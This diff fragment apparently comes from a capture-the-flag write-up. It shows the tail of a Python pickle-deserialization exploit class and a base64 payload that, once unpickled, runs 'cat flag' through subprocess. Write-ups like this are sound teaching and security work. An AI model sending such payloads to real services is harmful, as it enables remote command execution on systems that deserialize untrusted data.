@@ -109,6 +109,7 @@ class Exploit(object):
 print base64.b64encode(cPickle.dumps(Exploit()))
 ```
 
+```
 Input:
 Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCigobHAyClMnY2F0JwpwMwphUydmbGFnJwpwNAphdFJwNQou
 
